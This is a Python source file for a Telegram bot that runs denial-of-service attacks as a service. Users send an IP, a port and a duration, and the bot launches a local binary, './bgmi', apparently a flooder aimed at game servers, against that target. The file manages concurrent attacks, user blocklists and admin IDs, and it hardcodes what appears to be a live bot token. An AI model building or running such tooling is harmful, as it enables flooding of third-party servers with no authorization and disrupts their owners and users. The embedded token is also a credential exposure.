import time
import logging
from threading import Thread, Semaphore
import os
import telebot
import subprocess

BOT_TOKEN = '7911469417:AAGnEYu2tO5Cw0zMyrOI3qPQYIrLWVMR3lY'
ADMIN_IDS = [5682506670]
BLOCKLIST_FILE = 'blocklist.txt'
USER_PROFILES_FILE = 'user_profiles.txt'

bot = telebot.TeleBot(BOT_TOKEN)

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
attack_semaphore = Semaphore(2)
active_attacks = {}
user_profiles = {}

def ensure_file_exists(filename):
    if not os.path.exists(filename):
        with open(filename, 'w') as f:
            pass

ensure_file_exists(BLOCKLIST_FILE)
ensure_file_exists(USER_PROFILES_FILE)

def load_blocklist():
    if os.path.exists(BLOCKLIST_FILE):
        with open(BLOCKLIST_FILE, 'r') as f:
            return set(int(line.strip()) for line in f)
    return set()

def save_blocklist(blocklist):
    with open(BLOCKLIST_FILE, 'w') as f:
        for user_id in blocklist:
            f.write(f"{user_id}\n")

def load_user_profiles():
    if os.path.exists(USER_PROFILES_FILE):
        with open(USER_PROFILES_FILE, 'r') as f:
            return {int(line.split()[0]): line.split()[1:] for line in f}
    return {}

def save_user_profiles():
    with open(USER_PROFILES_FILE, 'w') as f:
        for user_id, data in user_profiles.items():
            f.write(f"{user_id} {' '.join(data)}\n")

blocklist = load_blocklist()
user_profiles = load_user_profiles()

def is_user_blocked(user_id):
    return user_id in blocklist

def block_user(user_id):
    blocklist.add(user_id)
    save_blocklist(blocklist)

def unblock_user(user_id):
    blocklist.discard(user_id)
    save_blocklist(blocklist)

def run_attack(user_id, target_ip, target_port, attack_duration):
    global active_attacks
    try:
        process = subprocess.Popen(["./bgmi", target_ip, str(target_port), "1", "12"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if user_id not in active_attacks:
            active_attacks[user_id] = []
        active_attacks[user_id].append((target_ip, target_port, process.pid))
        time.sleep(attack_duration)
        attack = next((a for a in active_attacks[user_id] if a[0] == target_ip and a[1] == target_port), None)
        if attack:
            try:
                subprocess.run(["kill", str(attack[2])], check=True)
            except subprocess.CalledProcessError as e:
                logging.error(f"Failed to kill process with PID {attack[2]}: {e}")
            active_attacks[user_id].remove(attack)
    finally:
        attack_semaphore.release()

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    if is_user_blocked(user_id):
        bot.send_message(message.chat.id, "*You are blocked from using this bot ⚠*", parse_mode='Markdown')
        return
    bot.send_message(message.chat.id, "Welcome! Send {ip} {port} {attack duration in seconds} to start an attack. Maximum duration: 180 seconds.")

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = """
    Available commands:
    /start - Welcome message
    /help - Show this help message
    /blocklist <add/remove> <user_id> - Manage the blocklist (Admin only)
    /status - Check the status of active attacks
    /end - Stop your active attacks
    /feedback <your feedback> - Submit feedback or suggestions
    /id - Show your user ID
    """
    bot.send_message(message.chat.id, help_text)

@bot.message_handler(commands=['blocklist'])
def blocklist_command(message):
    if not message.from_user.id in ADMIN_IDS:
        bot.send_message(message.chat.id, "*YOU ARE NOT AUTHORIZED TO USE THIS ⚠*", parse_mode='Markdown')
        return
    cmd_parts = message.text.split()
    if len(cmd_parts) < 3:
        bot.send_message(message.chat.id, "*Invalid format. Use /blocklist <add/remove> <user_id>*", parse_mode='Markdown')
        return
    action = cmd_parts[1]
    target_user_id = int(cmd_parts[2])
    if action == 'add':
        block_user(target_user_id)
        bot.send_message(message.chat.id, f"User {target_user_id} has been blocked.")
    elif action == 'remove':
        unblock_user(target_user_id)
        bot.send_message(message.chat.id, f"User {target_user_id} has been unblocked.")
    else:
        bot.send_message(message.chat.id, "*Invalid action. Use 'add' or 'remove'.*", parse_mode='Markdown')

@bot.message_handler(commands=['status'])
def status_command(message):
    user_id = message.from_user.id
    if is_user_blocked(user_id):
        bot.send_message(message.chat.id, "*You are blocked from using this bot ⚠*", parse_mode='Markdown')
        return
    if user_id not in active_attacks or not active_attacks[user_id]:
        bot.send_message(message.chat.id, "No active attacks.")
        return
    status_message = "Active attacks:\n"
    for attack in active_attacks[user_id]:
        status_message += f"- Target: {attack[0]}:{attack[1]}\n"
    bot.send_message(message.chat.id, status_message)

@bot.message_handler(commands=['feedback'])
def feedback_command(message):
    user_id = message.from_user.id
    feedback = message.text.replace("/feedback ", "").strip()
    if feedback:
        bot.send_message(ADMIN_IDS[0], f"Feedback from {user_id}: {feedback}")
        bot.send_message(message.chat.id, "Thank you for your feedback!")
    else:
        bot.send_message(message.chat.id, "*Please provide your feedback after the command.*", parse_mode='Markdown')

@bot.message_handler(func=lambda message: True)
def handle_attack(message):
    user_id = message.from_user.id
    if is_user_blocked(user_id):
        bot.send_message(message.chat.id, "*You are blocked from using this bot ⚠*", parse_mode='Markdown')
        return
    try:
        cmd_parts = message.text.split()
        if len(cmd_parts) != 3:
            bot.send_message(message.chat.id, "*Invalid format. Use {ip} {port} {attack duration in seconds}*", parse_mode='Markdown')
            return
        target_ip = cmd_parts[0]
        target_port = int(cmd_parts[1])
        attack_duration = int(cmd_parts[2])
        if attack_duration > 180:
            bot.send_message(message.chat.id, "*Attack duration cannot exceed 180 seconds.*", parse_mode='Markdown')
            return
        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"Port {target_port} is blocked and cannot be used.", parse_mode='Markdown')
            return
        if not attack_semaphore.acquire(blocking=False):
            bot.send_message(message.chat.id, "*Maximum concurrent attacks reached. Please wait.*", parse_mode='Markdown')
            return
        bot.send_message(message.chat.id, f"Starting attack on {target_ip}:{target_port} for {attack_duration} seconds.")
        attack_thread = Thread(target=run_attack, args=(user_id, target_ip, target_port, attack_duration))
        attack_thread.start()
    except ValueError:
        bot.send_message(message.chat.id, "*Invalid input. Ensure port and attack duration are numbers.*", parse_mode='Markdown')

@bot.message_handler(commands=['end'])
def end_all_attacks(message):
    user_id = message.from_user.id
    if is_user_blocked(user_id):
        bot.send_message(message.chat.id, "*You are blocked from using this bot ⚠*", parse_mode='Markdown')
        return
    if user_id not in active_attacks or not active_attacks[user_id]:
        bot.send_message(message.chat.id, "No active attacks to stop.")
        return
    for attack in active_attacks[user_id]:
        try:
            subprocess.run(["kill", str(attack[2])], check=True)
            bot.send_message(message.chat.id, f"Attack on {attack[0]}:{attack[1]} has been stopped.")
        except subprocess.CalledProcessError as e:
            logging.error(f"Failed to kill process with PID {attack[2]}: {e}")
    active_attacks[user_id] = []

@bot.message_handler(commands=['id'])
def show_id(message):
    user_id = message.from_user.id
    bot.send_message(message.chat.id, f"Your user ID is: {user_id}")

bot.polling(none_stop=True)
